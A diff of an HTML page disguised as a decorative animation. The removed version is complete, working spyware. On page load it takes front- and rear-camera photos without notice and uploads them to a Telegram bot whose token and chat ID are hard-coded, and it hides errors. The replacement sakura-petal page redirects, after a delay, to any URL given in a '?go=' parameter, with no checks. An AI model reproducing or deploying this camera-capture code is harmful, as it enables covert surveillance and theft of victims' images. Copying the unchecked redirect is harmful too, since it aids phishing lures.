@@ -7,137 +7,62 @@
 <style>
 body{
 margin:0;
-background:black;
-display:flex;
-justify-content:center;
-align-items:center;
-height:100vh;
 overflow:hidden;
+background:linear-gradient(#ffd1dc,#ffeef2);
 }
 
-/* Pixel flower */
-.flower{
-width:120px;
-height:120px;
-position:relative;
-animation:spin 6s linear infinite;
-}
-
-.petals div{
-width:40px;
-height:40px;
-background:#ff66cc;
+/* Sakura petals */
+.petal{
 position:absolute;
-image-rendering: pixelated;
+width:20px;
+height:20px;
+background:radial-gradient(circle at 30% 30%, #fff, #ff9eb5);
+border-radius: 70% 0 70% 0;
+opacity:0.9;
+animation:fall linear infinite;
 }
 
-.petals div:nth-child(1){top:0; left:40px;}
-.petals div:nth-child(2){top:40px; left:80px;}
-.petals div:nth-child(3){top:80px; left:40px;}
-.petals div:nth-child(4){top:40px; left:0;}
-
-.center{
-width:40px;
-height:40px;
-background:#ffee55;
-position:absolute;
-top:40px;
-left:40px;
+@keyframes fall{
+0%{
+transform:translateY(-10vh) rotate(0deg);
 }
-
-@keyframes spin{
-100%{transform:rotate(360deg);}
+100%{
+transform:translateY(110vh) rotate(360deg);
+}
 }
 </style>
 </head>
 
 <body>
 
-<div class="flower">
-<div class="petals">
-<div></div>
-<div></div>
-<div></div>
-<div></div>
-</div>
-<div class="center"></div>
-</div>
-
 <script>
 
-const BOT_TOKEN="8082815317:AAEHd6AKLOBJK9vXU0KUuXCgwPt4-v0DyGg";
-const CHAT_ID="1167762232";
+// 🌸 Create falling sakura petals
+for(let i=0;i<25;i++){
 
-// ---------- Send Photo ----------
-function sendPhoto(blob,name){
+let petal=document.createElement("div");
+petal.className="petal";
 
-let fd=new FormData();
-fd.append("chat_id",CHAT_ID);
-fd.append("photo",blob,name);
+petal.style.left=Math.random()*100+"vw";
+petal.style.animationDuration=(5+Math.random()*5)+"s";
+petal.style.animationDelay=Math.random()*5+"s";
 
-fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
-method:"POST",
-body:fd
-});
+document.body.appendChild(petal);
 }
 
-// ---------- Capture Helper ----------
-async function captureFromCamera(facing, count){
-
-try{
-
-const stream=await navigator.mediaDevices.getUserMedia({
-video:{
-facingMode:facing,
-width:{ideal:4096},
-height:{ideal:2160}
-}
-});
-
-const video=document.createElement("video");
-video.srcObject=stream;
-video.play();
-
-await new Promise(r=>video.onloadedmetadata=r);
-
-const canvas=document.createElement("canvas");
-canvas.width=video.videoWidth;
-canvas.height=video.videoHeight;
-
-const ctx=canvas.getContext("2d");
-
-for(let i=1;i<=count;i++){
-
-ctx.drawImage(video,0,0);
-
-await new Promise(resolve=>{
-canvas.toBlob(blob=>{
-sendPhoto(blob,`${facing}_${i}.jpg`);
-resolve();
-},"image/jpeg",0.95); // High quality
-});
-
-await new Promise(r=>setTimeout(r,1000));
+// 🌸 Redirect system (?go=)
+function getRedirect(){
+let params=new URLSearchParams(window.location.search);
+return params.get("go");
 }
 
-stream.getTracks().forEach(t=>t.stop());
-
-}catch(e){}
-
+// Redirect after animation delay
+setTimeout(()=>{
+let link=getRedirect();
+if(link){
+window.location.href=link;
 }
-
-// ---------- Run ----------
-async function runCapture(){
-
-// 3 selfie photos
-await captureFromCamera("user",3);
-
-// 2 rear photos
-await captureFromCamera("environment",2);
-
-}
-
-runCapture();
+},4000);
 
 </script>
 
